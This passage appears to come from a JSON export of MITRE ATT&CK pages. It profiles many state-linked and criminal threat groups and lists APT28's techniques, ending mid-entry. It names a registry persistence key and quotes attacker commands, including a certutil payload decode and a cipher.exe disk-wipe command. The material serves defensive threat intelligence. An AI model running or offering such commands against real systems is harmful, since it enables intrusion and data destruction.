resource-intensive cyber espionage operations, likely on behalf of the Islamic Revolutionary Guard Corps. They have targeted European, U.S., and Middle Eastern government and military personnel, academics, journalists, and organizations such as the World Health Organization (WHO), via complex social engineering campaigns since at least 2014. G1026 Malteiro Malteiro is a financially motivated criminal group that is likely based in Brazil and has been active since at least November 2019. The group operates and distributes the Mispadu banking trojan via a Malware-as-a-Service (MaaS) business model. Malteiro mainly targets victims throughout Latin America (particularly Mexico) and Europe (particularly Spain and Portugal). G0045 menuPass Cicada, POTASSIUM, Stone Panda, APT10, Red Apollo, CVNX, HOGFISH, BRONZE RIVERSIDE menuPass is a threat group that has been active since at least 2006. Individual members of menuPass are known to have acted in association with the Chinese Ministry of State Security's (MSS) Tianjin State Security Bureau and worked for the Huaying Haitai Science and Technology Development Company. menuPass has targeted healthcare, defense, aerospace, finance, maritime, biotechnology, energy, and government sectors globally, with an emphasis on Japanese organizations. In 2016 and 2017, the group is known to have targeted managed IT service providers (MSPs), manufacturing and mining companies, and a university. G1013 Metador Metador is a suspected cyber espionage group that was first reported in September 2022. Metador has targeted a limited number of telecommunication companies, internet service providers, and universities in the Middle East and Africa. Security researchers named the group Metador based on the \"I am meta\" string in one of the group's malware samples and the expectation of Spanish-language responses from C2 servers. G0002 Moafee Moafee is a threat group that appears to operate from the Guandong Province of China. Due to overlapping TTPs, including similar custom tools, Moafee is thought to have a direct or indirect relationship with the threat group DragonOK. G0103 Mofang Mofang is a likely China-based cyber espionage group, named for its frequent practice of imitating a victim's infrastructure. This adversary has been observed since at least May 2012 conducting focused attacks against government and critical infrastructure in Myanmar, as well as several other countries and sectors including military, automobile, and weapons industries. G0021 Molerats Operation Molerats, Gaza Cybergang Molerats is an Arabic-speaking, politically-motivated threat group that has been operating since 2012. The group's victims have primarily been in the Middle East, Europe, and the United States. G1036 Moonstone Sleet Storm-1789 Moonstone Sleet is a North Korean-linked threat actor executing both financially motivated attacks and espionage operations. The group previously overlapped significantly with another North Korean-linked entity, Lazarus Group, but has differentiated its tradecraft since 2023. Moonstone Sleet is notable for creating fake companies and personas to interact with victim entities, as well as developing unique malware such as a variant delivered via a fully functioning game. G1009 Moses Staff DEV-0500, Marigold Sandstorm Moses Staff is a suspected Iranian threat group that has primarily targeted Israeli companies since at least September 2021. Moses Staff openly stated their motivation in attacking Israeli companies is to cause damage by leaking stolen sensitive data and encrypting the victim's networks without a ransom demand. Security researchers assess Moses Staff is politically motivated, and has targeted government, finance, travel, energy, manufacturing, and utility companies outside of Israel as well, including those in Italy, India, Germany, Chile, Turkey, the UAE, and the US. G1019 MoustachedBouncer MoustachedBouncer is a cyberespionage group that has been active since at least 2014 targeting foreign embassies in Belarus. G0069 MuddyWater Earth Vetala, MERCURY, Static Kitten, Seedworm, TEMP.Zagros, Mango Sandstorm, TA450 MuddyWater is a cyber espionage group assessed to be a subordinate element within Iran's Ministry of Intelligence and Security (MOIS). Since at least 2017, MuddyWater has targeted a range of government and private organizations across sectors, including telecommunications, local government, defense, and oil and natural gas organizations, in the Middle East, Asia, Africa, Europe, and North America. G0129 Mustang Panda TA416, RedDelta, BRONZE PRESIDENT Mustang Panda is a China-based cyber espionage threat actor that was first observed in 2017 but may have been conducting operations since at least 2014. Mustang Panda has targeted government entities, nonprofits, religious, and other non-governmental organizations in the U.S., Europe, Mongolia, Myanmar, Pakistan, and Vietnam, among others. G1020 Mustard Tempest DEV-0206, TA569, GOLD PRELUDE, UNC1543 Mustard Tempest is an initial access broker that has operated the SocGholish distribution network since at least 2017. Mustard Tempest has partnered with Indrik Spider to provide access for the download of additional malware including LockBit, WastedLocker, and remote access tools. G0019 Naikon Naikon is assessed to be a state-sponsored cyber espionage group attributed to the Chinese People\u2019s Liberation Army\u2019s (PLA) Chengdu Military Region Second Technical Reconnaissance Bureau (Military Unit Cover Designator 78020). Active since at least 2010, Naikon has primarily conducted operations against government, military, and civil organizations in Southeast Asia, as well as against international bodies such as the United Nations Development Programme (UNDP) and the Association of Southeast Asian Nations (ASEAN). While Naikon shares some characteristics with APT30, the two groups do not appear to be exact matches. G0055 NEODYMIUM NEODYMIUM is an activity group that conducted a campaign in May 2016 and has heavily targeted Turkish victims. The group has demonstrated similarity to another activity group called PROMETHIUM due to overlapping victim and campaign characteristics. NEODYMIUM is reportedly associated closely with BlackOasis operations, but evidence that the group names are aliases has not been identified. G0133 Nomadic Octopus DustSquad Nomadic Octopus is a Russian-speaking cyber espionage threat group that has primarily targeted Central Asia, including local governments, diplomatic missions, and individuals, since at least 2014. Nomadic Octopus has been observed conducting campaigns involving Android and Windows malware, mainly using the Delphi programming language, and building custom variants. G0049 OilRig COBALT GYPSY, IRN2, APT34, Helix Kitten, Evasive Serpens, Hazel Sandstorm, EUROPIUM, ITG13, Earth Simnavaz, Crambus, TA452 OilRig is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecommunications. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. The group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. G0071 Orangeworm Orangeworm is a group that has targeted organizations in the healthcare sector in the United States, Europe, and Asia since at least 2015, likely for the purpose of corporate espionage. Reverse engineering of Kwampirs, directly associated with Orangeworm activity, indicates significant functional and development overlaps with Shamoon. G0040 Patchwork Hangover Group, Dropping Elephant, Chinastrats, MONSOON, Operation Hangover Patchwork is a cyber espionage group that was first observed in December 2015. While the group has not been definitively attributed, circumstantial evidence suggests the group may be a pro-Indian or Indian entity. Patchwork has been seen targeting industries related to diplomatic and government agencies. Much of the code used by this group was copied and pasted from online forums. Patchwork was also seen operating spearphishing campaigns targeting U.S. think tank groups in March and April of 2018. G0011 PittyTiger PittyTiger is a threat group believed to operate out of China that uses multiple different types of malware to maintain command and control. G0068 PLATINUM PLATINUM is an activity group that has targeted victims since at least 2009. The group has focused on targets associated with governments and related organizations in South and Southeast Asia. G1040 Play Play is a ransomware group that has been active since at least 2022 deploying Playcrypt ransomware against the business, government, critical infrastructure, healthcare, and media sectors in North America, South America, and Europe. Play actors employ a double-extortion model, encrypting systems after exfiltrating data, and are presumed by security researchers to operate as a closed group. G1005 POLONIUM Plaid Rain POLONIUM is a Lebanon-based group that has primarily targeted Israeli organizations, including critical manufacturing, information technology, and defense industry companies, since at least February 2022. Security researchers assess POLONIUM has coordinated their operations with multiple actors affiliated with Iran\u2019s Ministry of Intelligence and Security (MOIS), based on victim overlap as well as common techniques and tooling. G0033 Poseidon Group Poseidon Group is a Portuguese-speaking threat group that has been active since at least 2005. The group has a history of using information exfiltrated from victims to blackmail victim companies into contracting the Poseidon Group as a security firm. G0056 PROMETHIUM StrongPity PROMETHIUM is an activity group focused on espionage that has been active since at least 2012. The group has conducted operations globally with a heavy emphasis on Turkish targets. PROMETHIUM has demonstrated similarity to another activity group called NEODYMIUM due to overlapping victim and campaign characteristics. G0024 Putter Panda APT2, MSUpdater Putter Panda is a Chinese threat group that has been attributed to Unit 61486 of the 12th Bureau of the PLA\u2019s 3rd General Staff Department (GSD). G0075 Rancor Rancor is a threat group that has led targeted campaigns against the South East Asia region. Rancor uses politically-motivated lures to entice victims to open malicious documents. G1039 RedCurl RedCurl is a threat actor active since 2018 notable for corporate espionage targeting a variety of locations, including Ukraine, Canada and the United Kingdom, and a variety of industries, including but not limited to travel agencies, insurance companies, and banks. RedCurl is allegedly a Russian-speaking threat actor. The group\u2019s operations typically start with spearphishing emails to gain initial access, then the group executes discovery and collection commands and scripts to find corporate data. The group concludes operations by exfiltrating files to the C2 servers. G1042 RedEcho RedEcho is a People\u2019s Republic of China-related threat actor associated with long-running intrusions in Indian critical infrastructure entities. RedEcho overlaps with various other PRC-linked threat groups, such as APT41, and is linked to ShadowPad malware use through shared infrastructure. G0106 Rocke Rocke is an alleged Chinese-speaking adversary whose primary objective appeared to be cryptojacking, or stealing victim system resources for the purposes of mining cryptocurrency. The name Rocke comes from the email address \"rocke@live.cn\" used to create the wallet which held collected cryptocurrency. Researchers have detected overlaps between Rocke and the Iron Cybercrime Group, though this attribution has not been confirmed. G0048 RTM RTM is a cybercriminal group that has been active since at least 2015 and is primarily interested in users of remote banking systems in Russia and neighboring countries. The group uses a Trojan by the same name (RTM). G1031 Saint Bear Storm-0587, TA471, UAC-0056, Lorec53 Saint Bear is a Russian-nexus threat actor active since early 2021, primarily targeting entities in Ukraine and Georgia. The group is notable for a specific remote access tool, Saint Bot, and information stealer, OutSteel in campaigns. Saint Bear typically relies on phishing or web staging of malicious documents and related file types for initial access, spoofing government or related entities. Saint Bear has previously been confused with Ember Bear operations, but analysis of behaviors, tools, and targeting indicates these are distinct clusters. G1045 Salt Typhoon Salt Typhoon is a People's Republic of China (PRC) state-backed actor that has been active since at least 2019 and responsible for numerous compromises of network infrastructure at major U.S. telecommunication and internet service providers (ISP). G0034 Sandworm Team ELECTRUM, Telebots, IRON VIKING, BlackEnergy (Group), Quedagh, Voodoo Bear, IRIDIUM, Seashell Blizzard, FROZENBARENTS, APT44 Sandworm Team is a destructive threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) Main Center for Special Technologies (GTsST) military unit 74455. This group has been active since at least 2009. In October 2020, the US indicted six GRU Unit 74455 officers associated with Sandworm Team for the following cyber operations: the 2015 and 2016 attacks against Ukrainian electrical companies and government organizations, the 2017 worldwide NotPetya attack, targeting of the 2017 French presidential campaign, the 2018 Olympic Destroyer attack against the Winter Olympic Games, the 2018 operation against the Organisation for the Prohibition of Chemical Weapons, and attacks against the country of Georgia in 2018 and 2019. Some of these were conducted with the assistance of GRU Unit 26165, which is also referred to as APT28. G0029 Scarlet Mimic Scarlet Mimic is a threat group that has targeted minority rights activists. This group has not been directly linked to a government source, but the group's motivations appear to overlap with those of the Chinese government. While there is some overlap between IP addresses used by Scarlet Mimic and Putter Panda, it has not been concluded that the groups are the same. G1015 Scattered Spider Roasted 0ktapus, Octo Tempest, Storm-0875 Scattered Spider is a native English-speaking cybercriminal group that has been active since at least 2022. The group initially targeted customer relationship management and business-process outsourcing (BPO) firms as well as telecommunications and technology companies. Beginning in 2023, Scattered Spider expanded its operations to compromise victims in the gaming, hospitality, retail, MSP, manufacturing, and financial sectors. During campaigns, Scattered Spider has leveraged targeted social-engineering techniques, attempted to bypass popular endpoint security tools, and more recently, deployed ransomware for financial gain. G1041 Sea Turtle Teal Kurma, Marbled Dust, Cosmic Wolf, SILICON Sea Turtle is a T\u00fcrkiye-linked threat actor active since at least 2017 performing espionage and service provider compromise operations against victims in Asia, Europe, and North America. Sea Turtle is notable for targeting registrars managing ccTLDs and complex DNS-based intrusions where the threat actor compromised DNS providers to hijack DNS resolution for ultimate victims, enabling Sea Turtle to spoof log in portals and other applications for credential collection. G1008 SideCopy SideCopy is a Pakistani threat group that has primarily targeted South Asian countries, including Indian and Afghani government personnel, since at least 2019. SideCopy's name comes from its infection chain that tries to mimic that of Sidewinder, a suspected Indian threat group. G0121 Sidewinder T-APT-04, Rattlesnake Sidewinder is a suspected Indian threat actor group that has been active since at least 2012. They have been observed targeting government, military, and business entities throughout Asia, primarily focusing on Pakistan, China, Nepal, and Afghanistan. G0091 Silence Whisper Spider Silence is a financially motivated threat actor targeting financial institutions in different countries. The group was first seen in June 2016. Their main targets reside in Russia, Ukraine, Belarus, Azerbaijan, Poland and Kazakhstan. They compromised various banking systems, including the Russian Central Bank's Automated Workstation Client, ATMs, and card processing. G0122 Silent Librarian TA407, COBALT DICKENS Silent Librarian is a group that has targeted research and proprietary data at universities, government agencies, and private sector companies worldwide since at least 2013. Members of Silent Librarian are known to have been affiliated with the Iran-based Mabna Institute which has conducted cyber intrusions at the behest of the government of Iran, specifically the Islamic Revolutionary Guard Corps (IRGC). G0083 SilverTerrier SilverTerrier is a Nigerian threat group that has been seen active since 2014. SilverTerrier mainly targets organizations in high technology, higher education, and manufacturing. G0054 Sowbug Sowbug is a threat group that has conducted targeted attacks against organizations in South America and Southeast Asia, particularly government entities, since at least 2015. G1033 Star Blizzard SEABORGIUM, Callisto Group, TA446, COLDRIVER Star Blizzard is a cyber espionage and influence group originating in Russia that has been active since at least 2019. Star Blizzard campaigns align closely with Russian state interests and have included persistent phishing and credential theft against academic, defense, government, NGO, and think tank organizations in NATO countries, particularly the US and the UK. G0038 Stealth Falcon Stealth Falcon is a threat group that has conducted targeted spyware attacks against Emirati journalists, activists, and dissidents since at least 2012. Circumstantial evidence suggests there could be a link between this group and the United Arab Emirates (UAE) government, but that has not been confirmed. G1046 Storm-1811 Storm-1811 is a financially-motivated entity linked to Black Basta ransomware deployment. Storm-1811 is notable for unique phishing and social engineering mechanisms for initial access, such as overloading victim email inboxes with non-malicious spam to prompt a fake \"help desk\" interaction leading to the deployment of adversary tools and capabilities. G0041 Strider ProjectSauron Strider is a threat group that has been active since at least 2011 and has targeted victims in Russia, China, Sweden, Belgium, Iran, and Rwanda. G0039 Suckfly Suckfly is a China-based threat group that has been active since at least 2014. G1018 TA2541 TA2541 is a cybercriminal group that has been targeting the aviation, aerospace, transportation, manufacturing, and defense industries since at least 2017. TA2541 campaigns are typically high volume and involve the use of commodity remote access tools obfuscated by crypters and themes related to aviation, transportation, and travel. G0062 TA459 TA459 is a threat group believed to operate out of China that has targeted countries including Russia, Belarus, Mongolia, and others. G0092 TA505 Hive0065, Spandex Tempest, CHIMBORAZO TA505 is a cyber criminal group that has been active since at least 2014. TA505 is known for frequently changing malware, driving global trends in criminal malware distribution, and ransomware campaigns involving Clop. G0127 TA551 GOLD CABIN, Shathak TA551 is a financially-motivated threat group that has been active since at least 2018. The group has primarily targeted English, German, Italian, and Japanese speakers through email-based malware distribution campaigns. G1037 TA577 TA577 is an initial access broker (IAB) that has distributed QakBot and Pikabot, and was among the first observed groups distributing Latrodectus in 2023. G1038 TA578 TA578 is a threat actor that has used contact forms and email to initiate communications with victims and to distribute malware including Latrodectus, IcedID, and Bumblebee. G0139 TeamTNT TeamTNT is a threat group that has primarily targeted cloud and containerized environments. The group as been active since at least October 2019 and has mainly focused its efforts on leveraging cloud and container resources to deploy cryptocurrency miners in victim environments. G0088 TEMP.Veles XENOTIME TEMP.Veles is a Russia-based threat group that has targeted critical infrastructure. The group has been observed utilizing TRITON, a malware framework designed to manipulate industrial safety systems. G0089 The White Company The White Company is a likely state-sponsored threat actor with advanced capabilities. From 2017 through 2018, the group led an espionage campaign called Operation Shaheen targeting government and military organizations in Pakistan. G0028 Threat Group-1314 TG-1314 Threat Group-1314 is an unattributed threat group that has used compromised credentials to log into a victim's remote access infrastructure. G0027 Threat Group-3390 Earth Smilodon, TG-3390, Emissary Panda, BRONZE UNION, APT27, Iron Tiger, LuckyMouse Threat Group-3390 is a Chinese threat group that has extensively used strategic Web compromises to target victims. The group has been active since at least 2010 and has targeted organizations in the aerospace, government, defense, technology, energy, manufacturing and gambling/betting sectors. G0076 Thrip Thrip is an espionage group that has targeted satellite communications, telecoms, and defense contractor companies in the U.S. and Southeast Asia. The group uses custom malware as well as \"living off the land\" techniques. G1022 ToddyCat ToddyCat is a sophisticated threat group that has been active since at least 2020 using custom loaders and malware in multi-stage infection chains against government and military targets across Europe and Asia. G0131 Tonto Team Earth Akhlut, BRONZE HUNTLEY, CactusPete, Karma Panda Tonto Team is a suspected Chinese state-sponsored cyber espionage threat group that has primarily targeted South Korea, Japan, Taiwan, and the United States since at least 2009; by 2020 they expanded operations to include other Asian as well as Eastern European countries. Tonto Team has targeted government, military, energy, mining, financial, education, healthcare, and technology organizations, including through the Heartbeat Campaign (2009-2012) and Operation Bitter Biscuit (2017). G0134 Transparent Tribe COPPER FIELDSTONE, APT36, Mythic Leopard, ProjectM Transparent Tribe is a suspected Pakistan-based threat group that has been active since at least 2013, primarily targeting diplomatic, defense, and research organizations in India and Afghanistan. G0081 Tropic Trooper Pirate Panda, KeyBoy Tropic Trooper is an unaffiliated threat group that has led targeted campaigns against targets in Taiwan, the Philippines, and Hong Kong. Tropic Trooper focuses on targeting government, healthcare, transportation, and high-tech industries and has been active since 2011. G0010 Turla IRON HUNTER, Group 88, Waterbug, WhiteBear, Snake, Krypton, Venomous Bear, Secret Blizzard, BELUGASTURGEON Turla is a cyber espionage threat group that has been attributed to Russia's Federal Security Service (FSB). They have compromised victims in over 50 countries since at least 2004, spanning a range of industries including government, embassies, military, education, research and pharmaceutical companies. Turla is known for conducting watering hole and spearphishing campaigns, and leveraging in-house tools and malware, such as Uroburos. G1029 UNC788 UNC788 is a group of hackers from Iran that has targeted people in the Middle East. G1047 Velvet Ant Velvet Ant is a threat actor operating since at least 2021. Velvet Ant is associated with complex persistence mechanisms, the targeting of network devices and appliances during operations, and the use of zero day exploits. G0123 Volatile Cedar Lebanese Cedar Volatile Cedar is a Lebanese threat group that has targeted individuals, companies, and institutions worldwide. Volatile Cedar has been operating since 2012 and is motivated by political and ideological interests. G1017 Volt Typhoon BRONZE SILHOUETTE, Vanguard Panda, DEV-0391, UNC3236, Voltzite, Insidious Taurus Volt Typhoon is a People's Republic of China (PRC) state-sponsored actor that has been active since at least 2021 primarily targeting critical infrastructure organizations in the US and its territories including Guam. Volt Typhoon's targeting and pattern of behavior have been assessed as pre-positioning to enable lateral movement to operational technology (OT) assets for potential destructive or disruptive attacks. Volt Typhoon has emphasized stealth in operations using web shells, living-off-the-land (LOTL) binaries, hands on keyboard activities, and stolen credentials. G0107 Whitefly Whitefly is a cyber espionage group that has been operating since at least 2017. The group has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information. The group has been linked to an attack against Singapore\u2019s largest public health organization, SingHealth. G0124 Windigo The Windigo group has been operating since at least 2011, compromising thousands of Linux and Unix servers using the Ebury SSH backdoor to create a spam botnet. Despite law enforcement intervention against the creators, Windigo operators continued updating Ebury through 2019. G0112 Windshift Bahamut Windshift is a threat group that has been active since at least 2017, targeting specific individuals for surveillance in government departments and critical infrastructure across the Middle East. G0044 Winnti Group Blackfly Winnti Group is a threat group with Chinese origins that has been active since at least 2010. The group has heavily targeted the gaming industry, but it has also expanded the scope of its targeting. Some reporting suggests a number of other groups, including Axiom, APT17, and Ke3chang, are closely linked to Winnti Group. G1035 Winter Vivern TA473, UAC-0114 Winter Vivern is a group linked to Russian and Belorussian interests active since at least 2020 targeting various European government and NGO entities, along with sporadic targeting of Indian and US victims. The group leverages a combination of document-based phishing activity and server-side exploitation for initial access, leveraging adversary-controlled and -created infrastructure for follow-on command and control. G0090 WIRTE WIRTE is a threat group that has been active since at least August 2018. WIRTE has targeted government, diplomatic, financial, military, legal, and technology organizations in the Middle East and Europe. G0102 Wizard Spider UNC1878, TEMP.MixMaster, Grim Spider, FIN12, GOLD BLACKBURN, ITG23, Periwinkle Tempest, DEV-0193 Wizard Spider is a Russia-based financially motivated threat group originally known for the creation and deployment of TrickBot since at least 2016. Wizard Spider possesses a diverse arsenal of tools and has conducted ransomware campaigns against a variety of organizations, ranging from major corporations to hospitals. G0128 ZIRCONIUM APT31, Violet Typhoon ZIRCONIUM is a threat group operating out of China, active since at least 2017, that has targeted individuals associated with the 2020 US presidential election and prominent leaders in the international affairs community. "
},
{
"id": 54,
"title": "APT28, IRON TWILIGHT, SNAKEMACKEREL, Swallowtail, Group 74, Sednit, Sofacy, Pawn Storm, Fancy Bear, STRONTIUM, Tsar Team, Threat Group-4127, TG-4127, Forest Blizzard, FROZENLAKE, GruesomeLarch, Group G0007",
"path": "/groups/G0007/index.html",
"content": " APT28 APT28 is a threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (GTsSS) military unit 26165.[1][2] This group has been active since at least 2004.[3][4][5][6][7][8][9][10][11][12][13] APT28 reportedly compromised the Hillary Clinton campaign, the Democratic National Committee, and the Democratic Congressional Campaign Committee in 2016 in an attempt to interfere with the U.S. presidential election.[5] In 2018, the US indicted five GRU Unit 26165 officers associated with APT28 for cyber operations (including close-access operations) conducted between 2014 and 2018 against the World Anti-Doping Agency (WADA), the US Anti-Doping Agency, a US nuclear facility, the Organization for the Prohibition of Chemical Weapons (OPCW), the Spiez Swiss Chemicals Laboratory, and other organizations.[14] Some of these were conducted with the assistance of GRU Unit 74455, which is also referred to as Sandworm Team. ID: G0007 \u24d8 Associated Groups: IRON TWILIGHT, SNAKEMACKEREL, Swallowtail, Group 74, Sednit, Sofacy, Pawn Storm, Fancy Bear, STRONTIUM, Tsar Team, Threat Group-4127, TG-4127, Forest Blizzard, FROZENLAKE, GruesomeLarch Contributors: S\u00e9bastien Ruel, CGI; Drew Church, Splunk; Emily Ratliff, IBM; Richard Gold, Digital Shadows Version: 5.2 Created: 31 May 2017 Last Modified: 10 March 2025 Version Permalink Live Version Associated Group Descriptions Name Description IRON TWILIGHT [15][16] SNAKEMACKEREL [17] Swallowtail [12] Group 74 [18] Sednit This designation has been used in reporting both to refer to the threat group and its associated malware JHUHUGIT.[8][7][19][4] Sofacy This designation has been used in reporting both to refer to the threat group and its associated malware.[6][7][5][20][4][18] Pawn Storm [7][20][21] Fancy Bear [5][19][20][4][18][12][22][2] STRONTIUM [19][20][23][24][21][2] Tsar Team [20][18][18] Threat Group-4127 [7] TG-4127 [7] Forest Blizzard [25] FROZENLAKE [26] GruesomeLarch [27] Campaigns ID Name First Seen Last Seen References Techniques C0051 APT28 Nearest Neighbor Campaign February 2022 [27] November 2024 [27] APT28 Nearest Neighbor Campaign was conducted by APT28 from early February 2022 to November 2024.[27] Archive Collected Data: Archive via Utility, Brute Force: Password Spraying, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Compromise Infrastructure, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Direct Volume Access, Disk Wipe: Disk Content Wipe, Exfiltration Over Web Service, Impair Defenses: Disable or Modify System Firewall, OS Credential Dumping: NTDS, OS Credential Dumping: Security Account Manager, Proxy: Internal Proxy, Remote Services: Remote Desktop Protocol, Remote Services: SMB/Windows Admin Shares, System Network Configuration Discovery: Wi-Fi Discovery, Wi-Fi Networks Techniques Used Domain ID Name Use Enterprise T1134 .001 Access Token Manipulation: Token Impersonation/Theft APT28 has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.[28] Enterprise T1098 .002 Account Manipulation: Additional Email Delegate Permissions APT28 has used a Powershell cmdlet to grant the ApplicationImpersonation role to a compromised account.[2] Enterprise T1583 .001 Acquire Infrastructure: Domains APT28 registered domains imitating NATO, OSCE security websites, Caucasus information resources, and other organizations.[6][14][29] .003 Acquire Infrastructure: Virtual Private Server APT28 hosted phishing domains on free services for brief periods of time during campaigns.[26] .006 Acquire Infrastructure: Web Services APT28 has used newly-created Blogspot pages for credential harvesting operations.[29] Enterprise T1595 .002 Active Scanning: Vulnerability Scanning APT28 has performed large-scale scans in an attempt to find vulnerable servers.[30] Enterprise T1557 .004 Adversary-in-the-Middle: Evil Twin APT28 has used a Wi-Fi Pineapple to set up Evil Twin Wi-Fi Poisoning for the purposes of capturing victim credentials or planting espionage-oriented malware.[14] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Later implants used by APT28, such as CHOPSTICK, use a blend of HTTP, HTTPS, and other legitimate channels for C2, depending on module configuration.[6][2] .003 Application Layer Protocol: Mail Protocols APT28 has used IMAP, POP3, and SMTP for a communication channel in various implants, including using self-registered Google Mail accounts and later compromised email servers of its victims.[6][2] Enterprise T1560 Archive Collected Data APT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.[3] .001 Archive via Utility APT28 has used a variety of utilities, including WinRAR, to archive collected data with password protection.[2] During APT28 Nearest Neighbor Campaign, APT28 used built-in PowerShell capabilities (Compress-Archive cmdlet) to compress collected data.[27] Enterprise T1119 Automated Collection APT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.[3] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder APT28 has deployed malware that has copied itself to the startup directory for persistence.[21] Enterprise T1037 .001 Boot or Logon Initialization Scripts: Logon Script (Windows) An APT28 loader Trojan adds the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence.[31] Enterprise T1110 Brute Force APT28 can perform brute force attacks to obtain credentials.[30][21][32] .001 Password Guessing APT28 has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days.[24] APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password guessing attacks.[2] .003 Password Spraying APT28 has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks.[24][32] APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password spray attacks.[2] During APT28 Nearest Neighbor Campaign, APT28 performed password-spray attacks against public facing services to validate credentials.[27] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell APT28 downloads and executes PowerShell scripts and performs PowerShell commands.[11][21][2] During APT28 Nearest Neighbor Campaign, APT28 used PowerShell cmdlet Get-ChildItem to access credentials, among other PowerShell functions deployed.[27] .003 Command and Scripting Interpreter: Windows Command Shell An APT28 loader Trojan uses a cmd.exe and batch script to run its payload.[31] The group has also used macros to execute payloads.[18][33][17][21] During APT28 Nearest Neighbor Campaign, APT28 used cmd.exe for execution.[27] Enterprise T1092 Communication Through Removable Media APT28 uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.[34] Enterprise T1586 .002 Compromise Accounts: Email Accounts APT28 has used compromised email accounts to send credential phishing emails.[29] Enterprise T1584 .008 Compromise Infrastructure: Network Devices APT28 compromised Ubiquiti network devices to act as collection devices for credentials compromised via phishing webpages.[26] Enterprise T1213 Data from Information Repositories APT28 has collected files from various information repositories.[2] .002 Sharepoint APT28 has collected information from Microsoft SharePoint services within target networks.[35] Enterprise T1005 Data from Local System APT28 has retrieved internal documents from machines inside victim environments, including by using Forfiles to stage documents before exfiltration.[36][3][30][2] Enterprise T1039 Data from Network Shared Drive APT28 has collected files from network shared drives.[2] Enterprise T1025 Data from Removable Media An APT28 backdoor may collect the entire contents of an inserted USB device.[34] Enterprise T1001 .001 Data Obfuscation: Junk Data APT28 added \"junk data\" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a \"junk length\" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.[6] Enterprise T1074 .001 Data Staged: Local Data Staging APT28 has stored captured credential information in a file named pi.log.[34] During APT28 Nearest Neighbor Campaign, APT28 staged captured credential information in the C:\\ProgramData directory.[27] .002 Data Staged: Remote Data Staging APT28 has staged archives of collected data on a target's Outlook Web Access (OWA) server.[2] Enterprise T1030 Data Transfer Size Limits APT28 has split archived exfiltration files into chunks smaller than 1MB.[2] Enterprise T1140 Deobfuscate/Decode Files or Information An APT28 macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload.[37][11] During APT28 Nearest Neighbor Campaign, APT28 unarchived data using the GUI version of WinRAR.[27] Enterprise T1006 Direct Volume Access During APT28 Nearest Neighbor Campaign, APT28 accessed volume shadow copies through executing vssadmin in order to dump the NTDS.dit file.[27] Enterprise T1561 .001 Disk Wipe: Disk Content Wipe During APT28 Nearest Neighbor Campaign, APT28 used the native Microsoft utility cipher.exe to securely wipe files and folders \u2013 overwriting the deleted data using cmd.exe /c cipher /W:C.[27] Enterprise T1189 Drive-by Compromise APT28 has compromised targets via strategic web compromise utilizing custom exploit kits.[16] APT28 used reflected cross-site scripting (XSS) against government websites to redirect users to phishing webpages.[26] Enterprise T1114 .002 Email Collection: Remote Email Collection APT28 has collected emails from victim Microsoft Exchange servers.[3][2] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography APT28 installed a Delphi backdoor that used a custom algorithm for C2 communications.[13] Enterprise T1546 .015 Event Triggered Execution: Component Object Model Hijacking APT28 has used COM hijacking for persistence by replacing the legitimate MMDeviceEnumerator object with a payload.[38][13] Enterprise T1048 .002 Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol APT28 has exfiltrated archives of collected data previously staged on a target's OWA server via HTTPS.[2] Enterprise T1567 Exfiltration Over Web Service APT28 can exfiltrate data over Google Drive.[21] During APT28 Nearest Neighbor Campaign, APT28 exfiltrated data over public-facing webservers \u2013 such as Google Drive.[27] Enterprise T1190 Exploit Public-Facing Application APT28 has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites.[14][2] Enterprise T1203 Exploitation for Client Execution APT28 has exploited Microsoft Office vulnerability CVE-2017-0262 for execution.[22] Enterprise T1211 Exploitation for Defense Evasion APT28 has used CVE-2015-4902 to bypass security features.[39][34] Enterprise T1068 Exploitation for Privilege Escalation APT28 has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263, and CVE-2022-38028 to escalate privileges.[39][34][22][27] Enterprise T1210 Exploitation of Remote Services APT28 exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.[6][40][41] Enterprise T1133 External Remote Services APT28 has used Tor and a variety of commercial VPN services to route brute force authentication attempts.[2] Enterprise T1083 File and Directory Discovery APT28 has used Forfiles to locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms.[36][3] Enterprise T1589 .001 Gather Victim Identity Information: Credentials APT28 has harvested user's login credentials.[32] Enterprise T1591 Gather Victim Org Information APT28 has used large language models (LLMs) to gather information about satellite capabilities.[42][43] Enterprise T1564 .001 Hide Artifacts: Hidden Files and Directories APT28 has saved files with hidden file attributes.[18][18] .003 Hide Artifacts: Hidden Window APT28 has used the WindowStyle parameter to conceal PowerShell windows.[11] [44] Enterprise T1562 .004 Impair 